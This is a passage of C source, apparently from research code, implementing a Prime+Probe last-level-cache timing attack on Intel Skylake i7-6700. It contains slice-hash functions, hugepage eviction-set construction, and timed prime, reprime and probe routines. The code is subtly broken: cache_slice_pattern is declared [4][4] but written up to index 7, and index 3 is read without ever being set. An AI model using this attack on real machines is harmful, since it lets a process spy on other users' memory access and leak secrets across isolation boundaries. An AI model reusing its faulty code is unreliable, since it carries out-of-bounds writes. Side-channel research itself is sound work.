    int bit3 = ((i_addr & 0x000080000) >> 19) ^ ((i_addr & 0x000400000) >> 22) ^ ((i_addr & 0x000800000) >> 23) ^ ((i_addr & 0x004000000) >> 26)
             ^ ((i_addr & 0x008000000) >> 27) ^ ((i_addr & 0x040000000) >> 30) ^ ((i_addr & 0x080000000) >> 31);

    // Solution 2
    int bit4 = ((i_addr & 0x000020000) >> 17) ^ ((i_addr & 0x000040000) >> 18) ^ ((i_addr & 0x000100000) >> 20) ^ ((i_addr & 0x000400000) >> 22)
             ^ ((i_addr & 0x001000000) >> 24) ^ ((i_addr & 0x002000000) >> 25) ^ ((i_addr & 0x004000000) >> 26) ^ ((i_addr & 0x008000000) >> 27)
             ^ ((i_addr & 0x010000000) >> 28) ^ ((i_addr & 0x040000000) >> 30) ^ ((i_addr & 0x100000000) >> 32);

    // Solution 3
    int bit5 = ((i_addr & 0x000020000) >> 17) ^ ((i_addr & 0x000080000) >> 19) ^ ((i_addr & 0x000100000) >> 20) ^ ((i_addr & 0x000200000) >> 21)
             ^ ((i_addr & 0x000400000) >> 22) ^ ((i_addr & 0x000800000) >> 23) ^ ((i_addr & 0x001000000) >> 24) ^ ((i_addr & 0x004000000) >> 26)
             ^ ((i_addr & 0x010000000) >> 28) ^ ((i_addr & 0x020000000) >> 29) ^ ((i_addr & 0x080000000) >> 31);

    // Solution 4
    int bit6 = ((i_addr & 0x000040000) >> 18) ^ ((i_addr & 0x000200000) >> 21) ^ ((i_addr & 0x000400000) >> 22) ^ ((i_addr & 0x002000000) >> 25)
             ^ ((i_addr & 0x004000000) >> 26) ^ ((i_addr & 0x020000000) >> 29) ^ ((i_addr & 0x100000000) >> 32);



//    return ((bit6 << 6) | (bit5 << 5) | (bit4 << 4) | (bit3 << 3) | (bit2 << 2) | (bit1 << 1) | bit0);
    return ((bit3 << 2) | (bit1 << 1) | bit0);


}


// Ivy Bridge i7-3770 FUNCTIONS
    
int skylake_i7_6700_setup(unsigned long int monline) {
    //printf("skylake_i7_6700_setup\n");
    unsigned long int cache_line_check_offset = monline & 0x00001FFFF;  // 0001 1111 1111 1111 1111
    printPtr2bin((void *)cache_line_check_offset);
    size_t mem_length = (size_t)MB(2); 
    unsigned long int x = 0;
    int i = 0;
    //int mem_length_char = ((int)mem_length/sizeof(char));
    //int mem_length_ptr = (int)mem_length/sizeof(void *);

// Cache slice selection algorithm needs verification
// p17 ⊕ p18 ⊕ p20 ⊕ p22 ⊕ p24 ⊕ p25 ⊕ p26 ⊕ p27 ⊕ p28 ⊕ p30 ⊕ p32
// p18 ⊕ p19 ⊕ p21 ⊕ p23 ⊕ p25 ⊕ p27 ⊕ p29 ⊕ p30 ⊕ p31 ⊕ p32

    int monline_cache_slice = skylake_i7_6700_cache_slice_alg((void *) monline);
    printf("monline_cache_slice\t:\t%d\n", monline_cache_slice);

    void *tmp[HUGE_PAGES_AVAILBLE];
    int B_idx = -1;
    int C_idx = -1;
    int D_idx = -1;
    int E_idx = -1;
    int F_idx = -1;
    int G_idx = -1;
    int H_idx = -1;
    int I_idx = -1;

    int cache_slice_pattern[4][4];

    cache_slice_pattern[0][0] = 0x0;
    cache_slice_pattern[0][1] = 0x9;

    cache_slice_pattern[1][0] = 0x2;
    cache_slice_pattern[1][1] = 0xb;

    cache_slice_pattern[2][0] = 0x3;
    cache_slice_pattern[2][1] = 0xa;

    cache_slice_pattern[3][0] = 0x1;
    cache_slice_pattern[3][1] = 0x8;

    cache_slice_pattern[4][0] = 0x6;
    cache_slice_pattern[4][1] = 0xf;

    cache_slice_pattern[5][0] = 0x4;
    cache_slice_pattern[5][1] = 0xd;

    cache_slice_pattern[6][0] = 0x5;
    cache_slice_pattern[6][1] = 0xc;

    cache_slice_pattern[7][0] = 0x7;
    cache_slice_pattern[7][1] = 0xe;



    for (i = 0; i < HUGE_PAGES_AVAILBLE; ++i) tmp[i] = NULL;

    for (i = 0; i < HUGE_PAGES_AVAILBLE; ++i) {
        tmp[i] = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
        printf("skylake_i7_6700_cache_slice_from_virt(tmp[i])\t:\t%d\n", skylake_i7_6700_cache_slice_from_virt(tmp[i]));
        //x += (unsigned long int)(*((unsigned int)tmp[i]));
        if (skylake_i7_6700_cache_slice_from_virt(tmp[i]) == 0) {     //monline_cache_slice
            if (B_idx == -1) {
                B = tmp[i];
                B_idx = i;
                continue;
            }
            if (C_idx == -1) {
                C = tmp[i];
                C_idx = i;
                continue;
            }
            if (D_idx == -1) {
                D = tmp[i];
                D_idx = i;
                continue;
            }
            if (E_idx == -1) {
                E = tmp[i];
                E_idx = i;
                continue;
            }
            if (F_idx == -1) {
                F = tmp[i];
                F_idx = i;
                continue;
            }
            if (G_idx == -1) {
                G = tmp[i];
                G_idx = i;
                continue;
            }
            if (H_idx == -1) {
                H = tmp[i];
                H_idx = i;
                continue;
            }
            if (I_idx == -1) {
                I = tmp[i];
                I_idx = i;
                break;
            }
        }
    }
    
    printf("B_idx\t:\t%d\n", B_idx);
    printf("C_idx\t:\t%d\n", C_idx);
    printf("D_idx\t:\t%d\n", D_idx);
    printf("E_idx\t:\t%d\n", E_idx);
    printf("F_idx\t:\t%d\n", F_idx);
    printf("G_idx\t:\t%d\n", G_idx);
    printf("H_idx\t:\t%d\n", H_idx);
    printf("I_idx\t:\t%d\n", I_idx);

    if (B_idx == -1 || C_idx == -1 || D_idx == -1 || E_idx == -1 || F_idx == -1 || G_idx == -1 || H_idx == -1 || I_idx == -1) return 0;

    // THIS FOR LOOP NEEDS REVISION (is munmap((void *) addr, size_t length) relieasing the hugepage as expected?)
    for (i = 0; i < HUGE_PAGES_AVAILBLE; ++i) {
        //printf("i\t:\t%d\n", i);
        if (i != B_idx && i != C_idx && i != D_idx && i != E_idx && i != F_idx && i != G_idx && i != H_idx && i != I_idx && tmp[i] != NULL) {
            munmap(tmp[i], MB(2));
        }
    }



    //B = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    //C = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);

    // check if memory was properly allocated

    x += (unsigned long int)B[MB(0)];
    x += (unsigned long int)C[MB(0)];
    x += (unsigned long int)D[MB(0)];
    x += (unsigned long int)E[MB(0)];
    x += (unsigned long int)F[MB(0)];
    x += (unsigned long int)G[MB(0)];
    x += (unsigned long int)H[MB(0)];
    x += (unsigned long int)I[MB(0)];

    //printf("B : %p\n", (void *)get_pfn(B));
    //printf("C : %p\n", (void *)get_pfn(C));


    B[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8);
    B[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8);

    C[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8);
    C[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8);

    D[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8);
    D[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8);

    E[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8);
    E[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(F + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8);

    F[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(F + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8);
    F[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(G + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8);

    G[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(G + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8);
    G[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(H + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8);

    H[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(H + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8);
    H[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(I + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8);

    I[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(I + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8);
    I[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8);




    if ( ((cache_slice_pattern[monline_cache_slice][3] << 17) + cache_line_check_offset + KB(32)) < MB(2) ) {
        B[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);

        C[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);

        D[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        D[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);

        E[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        E[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(F + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);

        F[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(F + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        F[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(G + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);

        G[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(G + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        G[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(H + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);

        H[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(H + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        H[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(I + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);

        I[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(I + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        I[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);


        init_reprime = B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8;
    } else {
        B[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);

        C[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);

        D[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        D[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);

        E[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        E[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(F + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);

        F[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(F + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        F[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(G + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);

        G[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(G + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        G[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(H + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);

        H[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(H + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        H[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(I + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);

        I[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(I + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        I[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);


        init_reprime = B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8;
    }


    init_prime = B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8;
    

    return 1;
}

void skylake_i7_6700_prime() {
    //printf("skylake_i7_6700_prime\n");
    TIMESTAMP_START;
    TIMESTAMP_STOP;
    TIMESTAMP_START;
    TIMESTAMP_STOP;
    volatile char **tmp1 = init_prime;
    //printf("%d : ", skylake_i7_6700_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", skylake_i7_6700_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", skylake_i7_6700_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", skylake_i7_6700_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", skylake_i7_6700_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", skylake_i7_6700_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", skylake_i7_6700_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", skylake_i7_6700_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", skylake_i7_6700_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", skylake_i7_6700_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", skylake_i7_6700_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", skylake_i7_6700_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", skylake_i7_6700_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", skylake_i7_6700_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", skylake_i7_6700_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", skylake_i7_6700_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", skylake_i7_6700_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
}

void skylake_i7_6700_reprime() {
    //printf("skylake_i7_6700_reprime\n");
    volatile char **tmp1 = init_reprime;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
}

unsigned long int skylake_i7_6700_probe() {
    //printf("skylake_i7_6700_probe\n");
    // PROBE & MEASURE
    unsigned long int begin, end;
    //unsigned long int begin2, end2;
    volatile char **tmp1 = init_prime;
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
/*
    TIMESTAMP_START;
    TIMESTAMP_STOP;
    begin2 = get_global_timestamp_start();
    end2 = get_global_timestamp_stop();
*/
    return (end-begin);//-(end2-begin2);
}


